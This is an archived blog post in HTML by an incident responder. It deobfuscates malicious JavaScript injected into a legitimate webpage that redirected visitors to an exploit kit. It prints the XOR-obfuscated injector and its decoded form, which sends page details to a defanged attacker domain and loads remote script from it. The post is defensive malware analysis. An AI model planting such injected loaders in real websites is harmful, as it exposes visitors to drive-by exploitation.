@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <title>JavaScript: Deobfuscate With Just A Print Function</title>
+  <meta name="description" content="VG9ueS5MYXR0ZXJpQEdtYWlsLmNvbQo=">
+  <meta name="author" content="Tony">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Tony Latteri">
+  <meta name="twitter:description" content="VG9ueS5MYXR0ZXJpQEdtYWlsLmNvbQo=">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Tony Latteri">
+  <meta property="og:description" content="VG9ueS5MYXR0ZXJpQEdtYWlsLmNvbQo=">
+
+  <link rel="apple-touch-icon" sizes="57x57" href="/images/favicons/apple-touch-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/images/favicons/apple-touch-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/images/favicons/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/favicons/apple-touch-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/images/favicons/apple-touch-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/images/favicons/apple-touch-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/images/favicons/apple-touch-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/images/favicons/apple-touch-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon-180x180.png">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-194x194.png" sizes="194x194">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-96x96.png" sizes="96x96">
+  <link rel="icon" type="image/png" href="/images/favicons/android-chrome-192x192.png" sizes="192x192">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" href="/images/favicons/favicon.ico">
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost//2015/JavaScript-Deobfuscate-With-Just-A-Print-Function/">
+  <link rel="alternate" type="application/rss+xml" title="Tony Latteri" href="/feed.xml">
+</head>
+
+
+  <body>
+    <span class="mobile btn-mobile-menu">
+  <i class="icon icon-list btn-mobile-menu__icon"></i>
+  <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+</span>
+  
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <a href="/" title="link to home of Tony Latteri">
+          <h1 class="panel-cover__title panel-title">Tony Latteri</h1>
+        </a>
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description">VG9ueS5MYXR0ZXJpQEdtYWlsLmNvbQo=</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item"><a href="/#blog" title="link to Tony Latteri blog" class="blog-button">Blog</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+          
+            
+
+            
+
+            
+
+            
+
+            
+
+            <!-- RSS -->
+            <li class="navigation__item">
+              <a href="/feed.xml" title="Subscribe" target="_blank">
+                <i class="icon icon-rss"></i>
+                <span class="label">RSS</span>
+              </a>
+            </li>
+          
+            </ul>
+          </nav>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="18 Oct 2015" class="post-meta__date date">18 Oct 2015</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#javascript">javascript</a> </span>
+    </div>
+    <h1 class="post-title">JavaScript: Deobfuscate With Just A Print Function</h1>
+  </header>
+
+  <section class="post">
+    <p>As an incident responder who deals with a lot of exploit kit related events, packet captures are invaluable. If you’re in the same boat, I hope you have pcaps for what triggered the alert, as well as some time on your hands to follow the trail back to the original source and start breaking down what occurred. It’s not uncommon for there to be multiple redirects to the exploit kit landing page, and once the source of the activity is located, you’ll probably be greeted with some nice obfuscated code.</p>
+
+<p>It’s no surpise that there are multiple ways to redirect users who visit a site, but a common way would be through JavaScript. Below is a sample of the latest malicious JavaScript I’ve come across that was injected into a legitimate webpage.</p>
+
+<h3 id="the-obfuscated-code">The Obfuscated Code</h3>
+<hr />
+
+<p>The following is what was noticed within the body of a webpage that was visited, right before the closing “&lt;/head&gt;” tag. Typically, malicious code is not formatted in a neat manner, and this case wasn’t any different. To format the output in a more readable format, a great online resource is <a href="http://jsbeautifier.org/">jsbeautifier</a>.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="s2">"'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G"</span><span class="p">;</span>
+
+<span class="nx">b</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+<span class="nx">c</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">clen</span><span class="p">;</span>
+<span class="nx">clen</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">clen</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+	<span class="nx">b</span><span class="o">+=</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="o">^</span><span class="mi">2</span><span class="p">)</span>
+	<span class="p">}</span>
+<span class="nx">c</span><span class="o">=</span><span class="nx">unescape</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">c</span><span class="p">);</span>
+</code></pre>
+</div>
+
+<h3 id="analysis-part-1">Analysis Part 1</h3>
+<hr />
+
+<p>So, clearly, this was pretty easy to pick out from the returned webpage when viewing the http stream.</p>
+
+<p>Lets review some of the methods that the malicious actor is using to hide the original code.</p>
+
+<ol>
+  <li><code class="highlighter-rouge">charCodeAt()</code>:
+    <ul>
+      <li>This method will return the unicode character of a letter based on the string that is  provided and the number that is passed to the argument.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">Bitwise XOR</code>:
+    <ul>
+      <li>The “^” operator in JavaScript is for bitwise XORing. In an example of “a XOR b”, if a == b, then the result is 0, else the result is 1.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">fromCharCode()</code>:
+    <ul>
+      <li>This method will convert a unicode number into its ascii character equivalent.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">unescape()</code>:
+    <ul>
+      <li>This method is used for the encoding and decoding of strings.</li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="the-greatness-of-printing">The Greatness of Printing</h3>
+<hr />
+
+<p>So we have the malicious JavaScript and did some research to get an understanding of how the original code is being hidden. If we don’t have the time to put together a script to reverse the encoded text, perhaps we can get away with a quicker work around.</p>
+
+<p>The great thing about this particular example is that we can see all of the code necessary to reverse the output was provided. In some cases, it’s not this simple and code might be loaded in from things like other scripts or html elements within the page.</p>
+
+<p>Lets take a look at the last line of code,<code class="highlighter-rouge">"document.write(c)"</code>. This method will write out the contents of the variable “c” back to the webpage, which is the decoded content. Instead of writing this back to the webpage, lets see what we can do to reveal this content.</p>
+
+<p>A great tool to help with this task is <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey">SpiderMonkey</a> from Mozilla. Follow the <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Build_Documentation">build instructions</a> for your operating system before continuing.</p>
+
+<p>Now that SpiderMonkey is installed, we can execute JavaScript from a terminal window for ease of use.</p>
+
+<ol>
+  <li>
+    <p>Copy the JavaScript from above and place it into a temporary file with a “.js” extension. For this example, I’ve called it mal.js</p>
+  </li>
+  <li>
+    <p>Before saving the file, edit the last line of code and switch it from “<code class="highlighter-rouge">document.write(c);</code>” to “<code class="highlighter-rouge">print(c);</code>”. Save the file.</p>
+  </li>
+  <li>
+    <p>From the terminal, type “js mal.js”.</p>
+  </li>
+</ol>
+
+<p>You should now see the decoded text. I’ve added brackets around the domain since it is malicious, so please be careful.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">stringGen</span><span class="p">(</span><span class="nx">len</span><span class="p">){</span>
+	<span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">charset</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyz0123456789"</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span> <span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span>
+    	<span class="nx">text</span> <span class="o">+=</span> <span class="nx">charset</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">charset</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
+        <span class="k">return</span> <span class="nx">text</span><span class="p">;</span>
+        <span class="p">}</span>
+
+<span class="nx">setTimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">default_keyword</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">se_referrer</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">referrer</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">base</span> <span class="o">=</span> <span class="s2">"i[.]illuminationes[.]com/jsnitch"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">uuid</span> <span class="o">=</span> <span class="nx">stringGen</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">n_url</span> <span class="o">=</span> <span class="s2">"http://"</span> <span class="o">+</span> <span class="nx">uuid</span> <span class="o">+</span> <span class="s2">"."</span> <span class="o">+</span> <span class="nx">base</span> <span class="o">+</span> <span class="s2">"?default_keyword="</span> <span class="o">+</span> <span class="nx">default_keyword</span> <span class="o">+</span>
+                <span class="s2">"&amp;se_referrer="</span> <span class="o">+</span> <span class="nx">se_referrer</span> <span class="o">+</span> <span class="s2">"&amp;source="</span> <span class="o">+</span> <span class="nx">host</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">default_keyword</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">default_keyword</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">&amp;&amp;</span> <span class="nx">se_referrer</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">se_referrer</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">){</span>
+    	<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">'&lt;script type="text/JavaScript" src="'</span> <span class="o">+</span> <span class="nx">n_url</span> <span class="o">+</span> <span class="s1">'"&gt;'</span> <span class="o">+</span> <span class="s1">'&lt;'</span> <span class="o">+</span> <span class="s1">'/script&gt;'</span><span class="p">);</span>
+        <span class="p">}</span>
+</code></pre>
+</div>
+
+<h3 id="analysis-part-2">Analysis Part 2</h3>
+<hr />
+
+<p>Now that we can see the code, the process starts over again with analyzing the sample to get an understanding of what is occurring.</p>
+
+<ol>
+  <li><code class="highlighter-rouge">stringGen(len)</code>:
+    <ul>
+      <li>Randomly generates a 5 character string. The result is assigned to the “uuid” variable.</li>
+    </ul>
+  </li>
+  <li>The following are standard JavaScript methods that access DOM elements.
+    <ul>
+      <li><code class="highlighter-rouge">document.title</code> - current page title.</li>
+      <li><code class="highlighter-rouge">document.referer</code> - the referrer webpage that lead to the current document.</li>
+      <li><code class="highlighter-rouge">window.location.host</code> - the current domain</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">var base</code>:
+    <ul>
+      <li>The base url which will be used in structuring the full url request.</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">var n_url</code>:
+    <ul>
+      <li>This variable holds the formatting of the url where additional JavaScript will be retreived. Example: “http://abcde.baseurl./directory?default_keyword=currentwebpagetitle&amp;se_referrer=documentreferrer&amp;source=currentdomain”</li>
+    </ul>
+  </li>
+  <li>The last couple lines is an “if” condition which evaluated whether or not the two variables exist (default_keyword and se_referrer).
+    <ul>
+      <li>If they exist, then an addidional &lt;script&gt; tag is added with the source being the completed url assigned to variable “n_url”.</li>
+      <li>If they do not, then the additonal JavaScript is not downloaded.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>So if you you went to the website directly (eg: without clicking a link from a google search), then the additonal JavaScript does not get executed.</p>
+
+<h3 id="summary">Summary</h3>
+<hr />
+
+<p>Alas, we’ve come this far only to hit a roadblock. Due to the random generation of 5 characters for the sub domain, DNS requests fail because the domains have not been stood up. It’s my guess that the adversary hasn’t been able to register all variations, which will likely lead to a lower success rate for exploitation. If you look up the main domain within <a href="https://www.virustotal.com/en/domain/i.illuminationes.com/information/">VirusTotal</a>, you will see that there are detections for a good amount of subdomains that match the naming convention we’ve uncovered. I’ve even tried reaching a couple of these without success. Even though we couldn’t get this to dance the way we wanted, it was a good exercise in reviewing JavaScript and obfuscation techniques.</p>
+
+  </section>
+  
+</article>
+
+
+
+      </div>
+
+      <footer class="footer">
+  <span class="footer__copyright">&copy; 2016 Tony. All rights reserved.</span>
+</footer> 
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+    </div>
+  </body>
+</html>
